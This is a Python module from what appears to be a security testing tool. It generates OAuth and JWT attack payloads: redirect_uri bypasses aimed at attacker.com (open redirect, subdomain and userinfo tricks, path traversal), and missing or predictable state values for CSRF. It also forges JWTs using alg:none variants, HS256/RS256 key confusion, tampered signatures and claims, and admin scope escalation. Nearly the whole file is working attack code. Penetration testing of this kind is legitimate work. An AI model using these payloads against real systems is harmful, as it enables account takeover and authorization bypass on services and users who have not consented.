"""oauth: Payload generation."""
from __future__ import annotations

import json
import time
import urllib.parse
from typing import Any, Dict, List, Optional

from argus.collectors.oauth.models import b64url_encode, create_hs256_jwt, create_mock_jwt


class OAuthPayloadGenerator:
    """
    Generates security testing payloads for OAuth 2.0 / OIDC workflows,
    JWT token tampering, and stateful session validation.
    """

    DEFAULT_ATTACKER_DOMAIN = "attacker.com"
    DEFAULT_ATTACKER_CALLBACK = "https://attacker.com/callback"

    def __init__(self, attacker_domain: str = "attacker.com"):
        self.attacker_domain = attacker_domain
        self.attacker_callback = f"https://{attacker_domain}/callback"

    def generate_redirect_uri_payloads(
        self,
        target_url: str,
        base_url: str,
    ) -> List[Dict[str, Any]]:
        """
        Generates redirect_uri manipulation vectors:
        - External domain (open redirect)
        - Subdomain matching bypass
        - Path traversal bypass
        """
        parsed_target = urllib.parse.urlparse(target_url or base_url)
        target_host = parsed_target.hostname or "target.com"
        target_scheme = parsed_target.scheme or "https"

        payloads: List[Dict[str, Any]] = [
            # 1. Direct external open redirect
            {
                "type": "open_redirect",
                "technique": "external_domain",
                "redirect_uri": self.attacker_callback,
                "description": "Direct redirection to external attacker domain",
                "severity": "critical",
                "template_id": "oauth-open-redirect",
            },
            {
                "type": "open_redirect",
                "technique": "external_domain_http",
                "redirect_uri": f"http://{self.attacker_domain}/oauth/cb",
                "description": "Unencrypted HTTP external domain redirection",
                "severity": "high",
                "template_id": "oauth-open-redirect",
            },
            # 2. Subdomain matching bypass
            {
                "type": "subdomain_bypass",
                "technique": "suffix_subdomain",
                "redirect_uri": f"{target_scheme}://{target_host}.{self.attacker_domain}/callback",
                "description": "Unvalidated subdomain suffix bypass",
                "severity": "critical",
                "template_id": "oauth-subdomain-bypass",
            },
            {
                "type": "subdomain_bypass",
                "technique": "hyphen_prefix_subdomain",
                "redirect_uri": f"{target_scheme}://attacker-{target_host}/callback",
                "description": "Hyphenated target host prefix bypass",
                "severity": "high",
                "template_id": "oauth-subdomain-bypass",
            },
            {
                "type": "subdomain_bypass",
                "technique": "userinfo_at_bypass",
                "redirect_uri": f"{target_scheme}://{target_host}@{self.attacker_domain}/callback",
                "description": "URI userinfo '@' character parsing bypass",
                "severity": "critical",
                "template_id": "oauth-subdomain-bypass",
            },
            # 3. Path traversal bypass
            {
                "type": "path_traversal_bypass",
                "technique": "dot_dot_slash",
                "redirect_uri": f"{target_scheme}://{target_host}/oauth/callback/../../attacker",
                "description": "Path traversal via dot-dot-slash sequence",
                "severity": "high",
                "template_id": "oauth-redirect-path-traversal",
            },
            {
                "type": "path_traversal_bypass",
                "technique": "semicolon_path_traversal",
                "redirect_uri": f"{target_scheme}://{target_host}/oauth/callback/..;/attacker",
                "description": "Path traversal via semicolon matrix sequence",
                "severity": "high",
                "template_id": "oauth-redirect-path-traversal",
            },
            {
                "type": "path_traversal_bypass",
                "technique": "url_encoded_path_traversal",
                "redirect_uri": f"{target_scheme}://{target_host}/oauth/callback/..%2f..%2fattacker",
                "description": "URL-encoded path traversal sequence",
                "severity": "high",
                "template_id": "oauth-redirect-path-traversal",
            },
        ]
        return payloads

    def generate_state_payloads(self) -> List[Dict[str, Any]]:
        """
        Generates state parameter test vectors to detect missing, static,
        or predictable state parameter validation (CSRF vulnerability).
        """
        return [
            {
                "type": "missing_state",
                "state_value": None,
                "description": "Omission of state parameter",
                "severity": "medium",
                "template_id": "oauth-missing-state",
            },
            {
                "type": "static_state",
                "state_value": "1",
                "description": "Static trivial state parameter value",
                "severity": "medium",
                "template_id": "oauth-static-state",
            },
            {
                "type": "predictable_state",
                "state_value": "state_12345",
                "description": "Predictable constant state parameter",
                "severity": "medium",
                "template_id": "oauth-predictable-state",
            },
        ]

    def generate_tampered_jwt_payloads(
        self,
        base_claims: Optional[Dict[str, Any]] = None,
        rsa_public_key_pem: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """
        Generates tampered JWT tokens across R2 token validation vectors:
        - alg:none signature bypass
        - invalid/forged signature acceptance
        - RS256 vs HS256 key confusion
        - expired exp timestamp
        - invalid aud and iss claims
        - future not-before (nbf) timestamp
        - modified/escalated scopes
        """
        now = int(time.time())
        claims = dict(base_claims or {
            "sub": "admin",
            "user": "admin",
            "name": "Administrator",
            "role": "admin",
            "roles": ["admin", "superuser"],
            "admin": True,
            "scope": "openid profile email admin read write",
            "iss": "https://auth.target.com",
            "aud": "api://default",
            "iat": now - 60,
            "exp": now + 3600,
        })

        # Public key string fallback for key confusion
        pub_key = rsa_public_key_pem or (
            "-----BEGIN PUBLIC KEY-----\n"
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozVcKBu8\n"
            "r7u01U8+7cZt3qO1070A+5E...dummy_rsa_public_key_for_testing...\n"
            "-----END PUBLIC KEY-----"
        )

        # 1. alg: none token (unsigned with empty signature)
        alg_none_header = {"alg": "none", "typ": "JWT"}
        alg_none_token = create_mock_jwt(alg_none_header, claims, signature=b"")

        # 2. Case variations of alg: none
        alg_none_upper_token = create_mock_jwt({"alg": "None", "typ": "JWT"}, claims, signature=b"")
        alg_none_capital_token = create_mock_jwt({"alg": "NONE", "typ": "JWT"}, claims, signature=b"")

        # 3. Invalid signature (valid HS256/RS256 header, tampered signature)
        hs256_header = {"alg": "HS256", "typ": "JWT"}
        invalid_sig_token = f"{b64url_encode(json.dumps(hs256_header))}.{b64url_encode(json.dumps(claims))}.INVALID_FORGED_SIGNATURE_BYTES_12345"

        # 4. Key confusion (HS256 signed using RSA public key string as secret)
        key_confusion_token = create_hs256_jwt(hs256_header, claims, secret=pub_key)

        # 5. Expired token (exp in past)
        expired_claims = dict(claims)
        expired_claims["exp"] = now - 7200  # Expired 2 hours ago
        expired_token = create_hs256_jwt(hs256_header, expired_claims, secret="dummy_secret_key_12345")

        # 6. Invalid audience (aud mismatch)
        invalid_aud_claims = dict(claims)
        invalid_aud_claims["aud"] = "https://unauthorized-consumer.attacker.com"
        invalid_aud_token = create_hs256_jwt(hs256_header, invalid_aud_claims, secret="dummy_secret_key_12345")

        # 7. Invalid issuer (iss mismatch)
        invalid_iss_claims = dict(claims)
        invalid_iss_claims["iss"] = "https://evil-untrusted-issuer.com"
        invalid_iss_token = create_hs256_jwt(hs256_header, invalid_iss_claims, secret="dummy_secret_key_12345")

        # 8. Future Not-Before (nbf) token
        future_nbf_claims = dict(claims)
        future_nbf_claims["nbf"] = now + 7200  # Valid only 2 hours in the future
        future_nbf_token = create_hs256_jwt(hs256_header, future_nbf_claims, secret="dummy_secret_key_12345")

        # 9. Token Scope Escalation (tampered scope claim)
        escalated_claims = dict(claims)
        escalated_claims["scope"] = "read write admin:all superuser:manage billing:write"
        escalated_scope_token = create_hs256_jwt(hs256_header, escalated_claims, secret="dummy_secret_key_12345")

        return [
            {
                "type": "alg_none",
                "token": alg_none_token,
                "description": "JWT with alg:none signature bypass",
                "severity": "critical",
                "template_id": "jwt-alg-none-bypass",
            },
            {
                "type": "alg_none_case_mutation",
                "token": alg_none_upper_token,
                "description": "JWT with alg:None case variation",
                "severity": "critical",
                "template_id": "jwt-alg-none-bypass",
            },
            {
                "type": "alg_none_capital_mutation",
                "token": alg_none_capital_token,
                "description": "JWT with alg:NONE capital variation",
                "severity": "critical",
                "template_id": "jwt-alg-none-bypass",
            },
            {
                "type": "invalid_signature",
                "token": invalid_sig_token,
                "description": "JWT with forged / invalid signature",
                "severity": "critical",
                "template_id": "jwt-invalid-signature",
            },
            {
                "type": "key_confusion",
                "token": key_confusion_token,
                "description": "JWT signed via HS256 using public RSA key",
                "severity": "critical",
                "template_id": "jwt-key-confusion",
            },
            {
                "type": "expired_token",
                "token": expired_token,
                "description": "Expired JWT (exp claim in the past)",
                "severity": "high",
                "template_id": "jwt-expired-token",
            },
            {
                "type": "invalid_audience",
                "token": invalid_aud_token,
                "description": "JWT with unauthorized audience (aud claim)",
                "severity": "high",
                "template_id": "jwt-invalid-audience",
            },
            {
                "type": "invalid_issuer",
                "token": invalid_iss_token,
                "description": "JWT with untrusted issuer (iss claim)",
                "severity": "high",
                "template_id": "jwt-invalid-issuer",
            },
            {
                "type": "future_nbf",
                "token": future_nbf_token,
                "description": "JWT with future not-before (nbf claim)",
                "severity": "medium",
                "template_id": "jwt-future-nbf",
            },
            {
                "type": "scope_escalation",
                "token": escalated_scope_token,
                "description": "JWT with escalated scope claims for privileged operations",
                "severity": "high",
                "template_id": "jwt-scope-escalation",
            },
        ]
